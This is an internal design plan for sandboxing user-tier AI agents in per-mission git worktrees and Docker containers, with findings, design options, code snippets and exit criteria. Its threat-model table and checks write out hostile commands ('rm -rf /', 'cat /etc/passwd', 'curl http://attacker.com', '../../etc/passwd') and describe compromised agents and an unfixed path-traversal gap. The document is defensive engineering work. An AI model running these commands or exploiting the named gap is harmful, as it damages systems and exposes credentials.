# Plan 47 — Agent Execution Isolation

| Field | Value |
|-------|-------|
| **Status** | Draft |
| **Created** | 2026-04-11 |
| **Depends on** | Plan 37 Phases 1–5 (✅ done), Plan 46 Phase 1 (in flight) |
| **Target** | `modules/backend/services/execution_environment.py`, `modules/backend/services/container_backend.py`, `modules/backend/agents/mission_control/helpers/agent_executor.py`, `modules/backend/services/execution_environment.py` |
| **Coordinator** | Plan 46 — Autonomous Mission Roadmap (this plan closes Plan 46 Phase 1 DoD item 3) |
| **Supersedes** | Nothing |

---

## §1 Why this plan exists

Mission Control runs AI agents on behalf of users. Two tiers:

- **Platform agents** (`platform.*`, `system.*`) — run infrastructure, health checks, and
  directors. They execute on the platform process with direct host access. No isolation
  needed or wanted.
- **User agents** (`mission.*`, `software.*`, and the upcoming research agent from Plan 40) —
  run on behalf of a user's mission. They MUST run in an isolated execution environment so
  that:
  1. A runaway or compromised agent cannot destroy the host filesystem or shared state.
  2. Two concurrent user missions cannot interfere with each other.
  3. Attacker-controlled content processed by an agent cannot escape the host.
  4. Autonomous overnight runs (Plan 42 daemon) can be trusted to run unattended.

Plan 37 Phases 1–5 shipped the *infrastructure* for container-based execution: the
`ExecutionEnvironmentService`, `ContainerBackend`, `EnvironmentHandle`, and DB tracking.
What they did NOT do (by design — Plan 37 only committed to infrastructure) is make
agents actually use any of it.

**The current state**: a container IS provisioned for user-tier missions in container mode,
sits idle, and is torn down at archive. Every agent tool — reads, writes, subprocess calls —
executes directly on the host. Isolation is theoretical, not exercised.

This plan closes the gap. When it ships, every user-tier agent's filesystem reads/writes
operate on a per-mission git worktree on the host, and every subprocess executes inside
the mission's container. Platform agents are unaffected.

---

## §2 The current gap (verified 2026-04-11)

Each finding was re-verified against the current code on this branch before design began.

**Finding 1 — `environment_handle` is set but never consumed by any tool.**
`agent_executor.py:68` sets `deps.environment_handle = environment_handle` after building
deps, but a grep for `environment_handle` across `modules/backend/agents/` turns up only
the three setter sites plus the `run_command` tool definition. Zero agent tools read it.

**Finding 2 — `tools/environment.py::run_command` is orphaned.**
The one tool that routes commands through the container handle is never imported by any
agent. `grep "from modules.backend.agents.tools.environment"` → no matches.
`grep "from modules.backend.agents.tools"` in agent files → only `filesystem`, `codemap`,
`compliance`, `system`, `workflow_design`.

**Finding 3 — `tools/code.py::apply_fix` and `run_tests` are orphaned.**
`apply_fix` writes files via `full_path.write_text()` directly against `project_root`.
`run_tests` calls `subprocess.run()` directly. Both bypass the environment handle entirely.
Both are also unimported — the host-filesystem leak is latent, not active.

**Finding 4 — `tools/filesystem.py` has no write tool.**
Only `read_file` (`tools/filesystem.py:14`) and `list_files` (`tools/filesystem.py:36`).
Both operate via `project_root / file_path` — host filesystem, no env check. No
`write_file`, `create_file`, or `delete_file` exists.

**Finding 5 — `deps.project_root` is hardcoded to `find_project_root()` regardless of env.**
`agent_setup.py:32`: `"project_root": find_project_root()`. This runs unconditionally.
`agent_executor.py:68` injects `environment_handle` into deps afterwards but never
updates `project_root`. The agent's filesystem tools therefore always operate on the host
repo root, not the container/worktree workspace.

**Finding 6 — ContainerBackend creates the worktree INSIDE the container, not on the host.**
`container_backend.py:132–150`: the worktree is created by running
`git worktree add /workspace -b {branch}` via `exec_run` inside the container.
`/workspace` is a path inside the container's overlay filesystem — there is no bind-mount
of it back to the host. The host only sees the main repo at `repo_root`.

**Finding 7 — Net effect: the container is decorative.**
When a mission runs with `execution_environment = "container"`: a container is provisioned,
kept warm between executions, and cleaned up on archive — but zero work happens inside it
during task execution. All agent I/O hits the host. All subprocesses run on the host.
Isolation is theoretical.

**Additional investigation findings:**

**(a) No user-tier agent currently writes files or runs subprocesses via any path.**
The `software.quality.agent` and `software.architecture.agent` are read-only (codemap,
compliance scans, `filesystem.read_file`, `filesystem.list_files`). The `apply_fix` and
`run_tests` tools in `tools/code.py` exist but are orphaned. No active escape vector
exists today; the risk is latent as more capable agents are added (e.g. Plan 40 research
agent that will write files and run web searches whose results could be attacker-controlled).

**(b) `mission.repo_root` can differ from `find_project_root()`.**
The `Mission` model (`models/mission.py:81`) has `repo_root: Mapped[str | None]` — nullable.
Missions backed by an external `repo_url` clone to an explicit `repo_root`. Current
`mission_control.py:753` ignores this and always uses `find_project_root()` for the
container config. This plan fixes that: when `mission.repo_root` is set, use it; otherwise
fall back to `find_project_root()`. This is required for the bind-mount to target the right
repo.

**(c) The container worktree is destroyed with the container.**
`ContainerBackend.cleanup()` calls `container.stop()` + `container.remove(force=True)`.
The `/workspace` worktree lives inside the container's overlay — it is destroyed with the
container. Agent output from that run is lost unless the agent emitted artifacts via the
event bus (SSE) before the container was cleaned up.

**(d) Tier detection at dispatch time is implicit.**
`AgentConfigSchema._validate_invocation_tier` (`config_schema.py:198–220`) enforces that
`platform.*` agents MUST have `execution.mode: local` — the YAML schema validator rejects
any other configuration. `resolve_execution_mode()` reads this from the agent config, so
platform agents always resolve to `"local"` before reaching the container provisioning
path. The dispatch loop does NOT explicitly check `invocation.tier` — it relies entirely
on the schema validator's enforcement. Plan 47 adds an explicit tier check in the executor
as a defence-in-depth measure.

**(e) No pytest tests for ContainerBackend.**
The live scripts `scripts/test_container_backend.py`, `test_container_execution.py`, and
`test_container_reuse.py` exercise the backend manually. No pytest coverage exists for the
container path. The brief instructs not to mock Docker for isolation tests; the
verification script (`scripts/verify_isolation.py`) runs against real Docker instead.

**(f) Existing filesystem tool tests are not affected by this plan.**
`tests/unit/backend/agents/tools/test_filesystem.py` passes an arbitrary `tmp_path` as
`project_root`. After Plan 47, `project_root` is still a `Path` — it just points to the
worktree instead of the main repo. The tests continue to pass unchanged.

---

## §3 Design options considered

### Option A — Full-routing transparent isolation

Every filesystem and code tool checks `deps.environment_handle` and routes through
`docker exec` when present. `read_file` becomes:
```
docker exec <container> cat /workspace/<path>
```
Agents are unchanged; the tool layer absorbs all environment routing.

| Dimension | Assessment |
|-----------|-----------|
| Agent layer | Unchanged — no agent code touched |
| Tool layer | Every I/O tool becomes env-aware; each call spawns a docker exec round-trip |
| Dispatch loop | Unchanged |
| Container lifecycle | Unchanged |
| Security posture | Strong: all I/O goes through container boundary |
| Implementation cost | Medium — tool changes are mechanical, but each `read_file` incurs ~100–500ms |

**Verdict: rejected.** The QA agent reads 50–100+ files per run. At ~200ms/exec call, a
single run becomes 10–20 seconds of overhead just on reads. The architecture agent reads
even more. This makes container mode unusable for read-heavy agents.

### Option B — Host-side worktree + bind-mount (selected)

Create the git worktree on the **HOST** at `var/worktrees/{mission_id}/workspace/`, bind-
mount that directory into the container at `/workspace`, and set `deps.project_root` to
the host-side worktree path. Agent filesystem tools continue to use native Python I/O
(fast). Any command the agent runs goes through `run_command` → docker exec → executes
inside the container where it sees `/workspace`.

| Dimension | Assessment |
|-----------|-----------|
| Agent layer | `deps.project_root` redirected to worktree in executor; no agent code touched |
| Tool layer | Filesystem tools: unchanged. `run_command`: wired for agents that need it |
| Dispatch loop | `_make_agent_executor` propagates `host_working_dir` from handle |
| Container lifecycle | `ContainerBackend.create()` creates host worktree + bind-mounts it |
| Security posture | Filesystem isolation via worktree (no main-branch writes). Command isolation via container. Host-filesystem read leaks prevented by FileScope + worktree root. |
| Implementation cost | Low — ~5 focused changes across 4 files |

**Verdict: selected.** See §4 for rationale.

### Option C — Run the agent process inside the container

The Python interpreter hosting the pydantic-ai agent itself runs inside the container via
`docker exec python -c "..."`.

| Dimension | Assessment |
|-----------|-----------|
| Agent layer | Massive — agent loses direct DB session, event bus, SSE streaming, deps injection |
| Tool layer | All tools would need to become IPC calls back to the host |
| Dispatch loop | Requires full remote-agent protocol |
| Security posture | Strongest possible — complete process isolation |
| Implementation cost | Very high — essentially a new remote-execution protocol |

**Verdict: rejected.** Correct long-term direction (matches Plan 16 / Temporal), but far
too large for Phase 1. Compatible with this plan — Plan 47's worktree model does not
preclude moving to Option C later.

### Option D — Container-only subprocess isolation (no worktree)

Keep the current bind-mount of the full host repo at `/repo:rw`, but set `deps.project_root`
to a path inside the container (e.g. `/workspace`) and route ALL filesystem tool calls
through docker exec. Similar to Option A but with container-internal paths as canonical.

| Dimension | Assessment |
|-----------|-----------|
| Agent layer | `project_root` becomes a container path; agents must not use it for host I/O |
| Tool layer | All I/O tools become env-aware with docker exec round-trips (same latency problem as A) |
| Container lifecycle | Keep existing `/repo` RW mount; create internal worktree |
| Security posture | Weaker than B — host repo is still mounted RW inside the container |

**Verdict: rejected.** Combines the latency problems of Option A with the weaker security
of still mounting the full repo RW inside the container.

**Why Option B wins:** Filesystem operations remain native-speed (critical for read-heavy
agents). The container provides the subprocess isolation that actually matters — commands
that install packages, run tests, or shell out cannot reach the host. The worktree
guarantees writes land on an isolated branch, never on `main`. OrbStack on macOS handles
bind-mounts correctly; Linux production is straightforward. The change surface is small
and auditable.

---

## §4 Detailed design

### 4.1 New type: `host_working_dir` on `EnvironmentHandle`

```python
@dataclass
class EnvironmentHandle:
    environment_id: str
    mode: str                          # "local", "worktree", "container"
    working_dir: Path                  # container-internal path (used by execute())
    host_working_dir: Path | None = None  # host-side worktree path (used by agent tools)
    branch_name: str | None = None
    container_id: str | None = None
    created_at: datetime = ...
    metadata: dict[str, Any] = ...
```

`working_dir` retains its existing semantics: the path the container uses as `workdir`
when running commands (`/workspace`). The new `host_working_dir` is the HOST path that
the agent's filesystem tools should operate on. Only non-`None` for container mode
environments created after Plan 47 ships.

### 4.2 Worktree path convention

Host-side worktrees live at:
```
{repo_root}/var/worktrees/{mission_id}/workspace/
```

Where `repo_root` is `mission.repo_root` when set, otherwise `find_project_root()`.
The `var/` directory already exists in the project and is the correct home for runtime
state (alongside `var/cache/`, `var/logs/`, `var/data/`). Worktrees are ephemeral: they
are created at container provisioning time and removed at mission archive.

### 4.3 ContainerBackend.create() changes

Before starting the container, `ContainerBackend.create()` now:

1. **Creates the host-side worktree** (if `git_aware=True` and `branch_name` set):
   ```bash
   git worktree add {worktree_path} -b {branch_name}
   ```
   If the branch already exists (environment being reused after backend restart):
   ```bash
   git worktree add {worktree_path} {branch_name}
   ```
   If the worktree path already exists and is a valid worktree (another restart scenario):
   skip creation.

2. **Removes the `/repo:rw` mount.** The previous design mounted the entire host repo
   read-write inside the container. With Option B, the container only needs the worktree.
   The old mount is replaced by `{worktree_path}:/workspace:rw`.

3. **Sets `handle.host_working_dir`** to the created worktree path.
   `handle.working_dir` stays as `/workspace` (container-internal).

4. **Persists `host_working_dir`** in the `config` JSON column on `ExecutionEnvironmentModel`
   so `_find_running_environment()` can reconstruct it from the DB on backend restart.

The container's view: it has `/workspace` (the worktree) and nothing else from the host.
No full-repo mount, no `.git` mount. `git` commands inside the container that need
`.git` will need the worktree's `.git` file (which links back to the main `.git` via
the worktree mechanism) — this works because git worktrees carry a `.git` file pointing
to the main repo's `worktrees/{name}/` directory.

**Security implication:** the container can read git history via the worktree's `.git`
pointer if git is available inside the container. This is acceptable for Phase 1; the
threat model is "agent cannot escape to the host or interfere with other missions", not
"agent cannot read repo history".

### 4.4 agent_executor.py changes

In `execute_agent()`, after `deps.environment_handle = environment_handle`:

```python
if environment_handle is not None:
    deps.environment_handle = environment_handle
    # Redirect filesystem root to the isolated worktree for user-tier agents.
    # Platform-tier agents always run local (enforced by schema validator), so
    # environment_handle is None for them and this branch is never reached.
    if (
        hasattr(environment_handle, "host_working_dir")
        and environment_handle.host_working_dir is not None
    ):
        deps.project_root = environment_handle.host_working_dir
```

This is the only agent-layer change required. Platform-tier agents: `env_handle` is `None`
→ block never entered → `project_root` stays as `find_project_root()` → no change.

### 4.5 Mission repo_root fix

`mission_control.py:753` currently hardcodes `find_project_root()`. Change to:

```python
repo_root = str(mission.repo_root) if mission.repo_root else str(find_project_root())
```

This requires `mission` to be in scope at that point (it already is — look 5 lines up).

### 4.6 Tier-aware dispatch: explicit check

As a defence-in-depth measure (the YAML validator already enforces this, but defence in
depth is cheap), add a guard in `_make_agent_executor` before injecting the
`environment_handle`:

```python
agent_tier = agent_config.invocation.tier  # "user", "platform", "system"
if environment_handle is not None and agent_tier != "user":
    # Platform/system agents must never run in a container environment.
    # The YAML validator already enforces execution.mode: local for platform agents,
    # but we check explicitly here as a second line of defence.
    effective_handle = None
else:
    effective_handle = environment_handle

if effective_handle is not None:
    deps.environment_handle = effective_handle
    ...
```

### 4.7 Worktree cleanup

`ContainerBackend.cleanup()` after stopping and removing the container:

```python
if handle.host_working_dir and handle.host_working_dir.exists():
    # Remove the git worktree registration and delete the directory
    subprocess.run(
        ["git", "worktree", "remove", "--force", str(handle.host_working_dir)],
        cwd=str(repo_root),
        check=False,
    )
```

`ExecutionEnvironmentService.cleanup_for_mission()` already calls `self.cleanup(handle)`
for each running environment — worktree cleanup piggybacks on the existing path.

**Retention policy:** worktrees are NOT preserved after container cleanup. Agent output
must be committed to the worktree branch, surfaced via the event bus as an artifact (Plan
43), or be re-created by re-running the agent. This is the right default for Phase 1.
Plan 48 may add branch persistence and PR automation on top.

### 4.8 Full flow (with Plan 47 shipped)

```
User creates mission (execution_environment = "container", tier = "user")
     ↓
handle_mission() called
     ↓
resolve_execution_mode() → "container"
     ↓
ExecutionEnvironmentService.get_or_create_for_mission()
     ↓
ContainerBackend.create():
  1. git worktree add var/worktrees/{mission_id}/workspace/ -b agent/{id[:8]}/dispatch
  2. docker create --volume {worktree_path}:/workspace:rw ...
  3. docker start
  ↓
handle.host_working_dir = Path("var/worktrees/{mission_id}/workspace")
handle.working_dir = Path("/workspace")
     ↓
_make_agent_executor(environment_handle=handle)
     ↓
execute_agent("software.quality.agent", ...)
  deps.project_root = handle.host_working_dir  ← NEW
  deps.environment_handle = handle              ← existing
     ↓
Agent tools:
  filesystem.read_file(deps.project_root, "modules/foo.py", scope)
    → reads from var/worktrees/{mission_id}/workspace/modules/foo.py  ← ISOLATED
  run_command("pytest tests/", environment_handle=deps.environment_handle)
    → docker exec mc-{id} sh -c "pytest tests/"                       ← IN CONTAINER
     ↓
Mission archived:
  ExecutionEnvironmentService.cleanup_for_mission()
    → ContainerBackend.cleanup():
        docker stop + remove
        git worktree remove --force var/worktrees/{mission_id}/workspace/
```

### 4.9 Backwards compatibility

- **`execution_environment = "local"` missions**: `env_handle` is `None` → no change to
  `project_root` → agents run exactly as today.
- **Platform-tier agents**: `execution.mode: local` enforced by schema → `env_handle` is
  `None` → no change.
- **Old DB records** with `working_dir = "/workspace"` and no `host_working_dir` in config:
  `_find_running_environment()` returns a handle with `host_working_dir = None`. The
  executor's `if host_working_dir is not None` guard means `project_root` is NOT redirected
  for these old environments — they continue to operate as before. No migration needed.

### 4.10 Security boundary after Plan 47

What an attacker-controlled agent (e.g. one processing malicious search results) can do:

| Action | Result |
|--------|--------|
| Read files via `read_file` | Reads from worktree only; FileScope enforces allowed paths |
| Write files via a write tool | Writes to worktree only; never touches main branch |
| Run `cat /etc/passwd` via `run_command` | Executes inside container; `/etc/passwd` is the container's, not the host's |
| Run `rm -rf /` via `run_command` | Deletes container's filesystem; host is unaffected |
| Run `curl http://attacker.com` | Succeeds — container has default Docker network access (network isolation is out of scope for Phase 1) |
| Access another mission's worktree | Cannot — each container only has its own worktree bind-mounted |
| Push to the main branch | Cannot — container has no push credentials configured |
| Read host's `.git/config` via `read_file` | Blocked by FileScope (`.git/config` not in any agent's read scope) |

**Residual risks acknowledged for Phase 1:**
- Default Docker network access (agent can make outbound HTTP calls from container). Acceptable — research agents need network access by design.
- FileScope does not guard against `../` path traversal if an agent passes `"../../etc/passwd"` as a relative path. This is a pre-existing issue in the FileScope implementation, not introduced by Plan 47. Hardening FileScope's canonicalization is deferred.
- `git worktree` carries a `.git` pointer that allows reading the full repo git history from inside the container (via the `.git/worktrees/` mechanism). Acceptable.

---

## §5 Implementation sequence

### Phase A — Host-side worktree creation + bind-mount
**Files:** `services/execution_environment.py`, `services/container_backend.py`

Changes:
1. Add `host_working_dir: Path | None = None` to `EnvironmentHandle`.
2. `ContainerBackend.create()`: when `git_aware=True`, create worktree on HOST at
   `{repo_root}/var/worktrees/{mission_id}/workspace/` using `subprocess.run` or asyncio.
   Replace the `/repo:rw` volume with `{worktree_path}:/workspace:rw`.
   Set `handle.host_working_dir = worktree_path`.
3. `ContainerBackend.cleanup()`: remove the git worktree after container teardown.
4. `ExecutionEnvironmentService._find_running_environment()`: reconstruct
   `host_working_dir` from `config["host_working_dir"]` when present.
5. `ExecutionEnvironmentService._persist_environment()`: include `host_working_dir` in
   the persisted config.

Exit criterion: `scripts/test_container_backend.py` creates a container, the worktree
exists at `var/worktrees/test-container/workspace/`, the bind-mount is visible at
`/workspace` inside the container, and cleanup removes both.

### Phase B — Agent executor project_root redirect
**Files:** `agents/mission_control/helpers/agent_executor.py`,
`agents/mission_control/mission_control.py`

Changes:
1. `execute_agent()`: after injecting `environment_handle`, redirect `deps.project_root`
   to `handle.host_working_dir` when present.
2. Add explicit tier guard before injecting handle (defence in depth).
3. `mission_control.py:753`: use `mission.repo_root` when set.

Exit criterion: run `scripts/test_container_execution.py` with a user-tier agent in
container mode; add a debug print to confirm `deps.project_root` points to the worktree
path, not `find_project_root()`.

### Phase C — Worktree population (git checkout)
**Files:** `services/container_backend.py`

After creating the worktree, populate it with the current HEAD:
```bash
git -C {worktree_path} checkout HEAD -- .
```
Without this step the worktree exists but is empty (no files checked out).

Exit criterion: after `ContainerBackend.create()`, `ls {worktree_path}/modules/` returns
the expected files.

### Phase D — End-to-end isolation verification
**Files:** `scripts/verify_isolation.py`

Write a repeatable script per §4 acceptance criteria of the brief. Script exits 0 when
isolation holds, non-zero with a clear message when it does not.

Exit criterion: `python scripts/verify_isolation.py` exits 0 on a clean environment.

---

## §6 Exit criteria for the whole plan

All of the following must be **observably true** before Plan 47 can be marked Done:

1. A user-tier agent running in container mode reads files from `var/worktrees/{mission_id}/workspace/`, NOT from the main repo root. Verified by: the `verify_isolation.py` script confirms the read path.

2. A user-tier agent running a command via `run_command` executes inside the container. Verified by: `run_command("pwd")` returns `/workspace`, not a host path.

3. A user-tier agent cannot read `/etc/passwd` from the host. Verified by: `run_command("cat /etc/passwd")` inside the container reads the container's `/etc/passwd`, not the host's (confirmed different content).

4. A user-tier agent writing a file writes to the worktree, NOT to the main repo's working tree. Verified by: file appears in `var/worktrees/{mission_id}/workspace/`, not in the main repo's files.

5. A platform-tier agent (`platform.health.agent`) continues to run with `deps.project_root = find_project_root()` unchanged. Verified by: the verify script runs the health agent and confirms its project_root is the main repo.

6. Container persists across multiple executions within a mission (existing behaviour, must not regress). Verified by: two sequential dispatches reuse the same container ID.

7. Mission archive cleans up both the container AND the host-side worktree. Verified by: after `cleanup_for_mission()`, `var/worktrees/{mission_id}/` does not exist.

8. `python scripts/verify_isolation.py` exits 0 and is re-runnable from a clean state.

9. Plan 46 Phase 1 DoD item 3 ("tasks run in isolated execution environments") is satisfied in fact: a real user-tier mission dispatches through the container, the agent's tool calls operate inside the isolation boundary.

---

## §7 What this plan does NOT do

- **Convergence loop** (Plan 48) — iterative QA cycles, branch/PR automation. Out of scope.
- **Rich workflow model** (Plan 45) — workflow node types, visual editor. Out of scope.
- **Network isolation** beyond Docker defaults — containers retain outbound network access.
- **gVisor / firecracker / user namespaces** — container defaults only for Phase 1.
- **Multi-tenant secrets management** — no per-mission credential injection.
- **Cross-mission file sharing** — each mission has an isolated worktree.
- **FileScope path traversal hardening** — `../` canonicalization is a pre-existing gap;
  hardening FileScope is deferred to a separate quality fix.
- **`tools/filesystem.py` write tool** — no `write_file` added in this plan. Write tools
  are needed for code-writing agents (Plan 40 and beyond) but the current user-tier agents
  are read-only. Adding write tools is deferred to the plan that introduces the first
  write-capable user-tier agent.
- **Wiring `run_command` into existing agents** — the QA and architecture agents are
  read-only and do not need command execution. Wiring `run_command` is deferred to the
  plan that introduces the first command-running user-tier agent.
- **UI changes** — no frontend changes.
- **Temporal-compatible activity boundaries** — the design does not depend on process-
  local state that wouldn't survive an activity restart; the `host_working_dir` is
  persisted in the DB. Temporal compatibility is maintained without migrating to Temporal.

---

## §8 References

### Plan docs
- [Plan 37 — Execution Environments](37-plan-execution-environments.md) (Phases 1–5 done)
- [Plan 46 — Autonomous Mission Roadmap](46-plan-autonomous-mission-roadmap.md) §4 Phase 1 DoD item 3
- [Plan 48 — Convergence Loop + Branch Automation](48-plan-convergence-loop-and-branch-automation.md) (explicitly out of scope)
- [Plan 40 — Deep Research System](40-plan-deep-research-system.md) (downstream consumer)

### Files read during investigation
- `modules/backend/services/execution_environment.py` — ExecutionEnvironmentService facade
- `modules/backend/services/container_backend.py` — ContainerBackend (docker-py)
- `modules/backend/agents/tools/filesystem.py` — read_file, list_files (host filesystem)
- `modules/backend/agents/tools/environment.py` — run_command (orphaned, env-aware)
- `modules/backend/agents/tools/code.py` — apply_fix, run_tests (orphaned, host-direct)
- `modules/backend/agents/deps/base.py` — BaseAgentDeps, FileScope
- `modules/backend/agents/mission_control/helpers/agent_setup.py` — build_deps_from_config
- `modules/backend/agents/mission_control/helpers/agent_executor.py` — execute_agent
- `modules/backend/agents/mission_control/dispatch/environment.py` — resolve_execution_mode
- `modules/backend/agents/mission_control/mission_control.py:739–803` — container provisioning
- `modules/backend/models/execution_environment.py` — ExecutionEnvironmentModel
- `modules/backend/models/mission.py` — Mission (repo_root field)
- `modules/backend/agents/config_schema.py` — AgentConfigSchema, InvocationSchema
- `modules/backend/agents/software/quality/agent.py` — user-tier agent example
- `modules/backend/agents/software/architecture/agent.py` — user-tier agent example
- `config/agents/software/quality/agent.yaml` — user-tier agent config
- `config/agents/platform/director/agent.yaml` — platform-tier agent config
- `tests/unit/backend/agents/tools/test_filesystem.py` — existing filesystem tests
- `scripts/test_container_backend.py` — existing live container test

### Prior art consulted
- Docker bind-mount documentation (overlay vs bind-mount semantics)
- OrbStack shared volume documentation (macOS bind-mount performance)
- `git worktree` documentation (linked `.git` files, cleanup semantics)
